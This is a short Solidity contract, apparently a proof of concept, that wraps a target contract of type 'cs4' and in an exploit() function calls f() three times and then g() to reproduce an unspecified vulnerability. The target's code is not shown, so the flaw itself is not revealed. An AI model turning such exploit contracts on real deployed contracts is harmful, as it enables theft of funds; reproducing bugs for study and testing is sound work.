contract ReproduceVuln {
    cs4 public target;

    constructor(address _target) {
        target = cs4(_target);
    }

    function exploit() public {
        target.f();
        target.f();
        target.f();
        target.g();
    }
}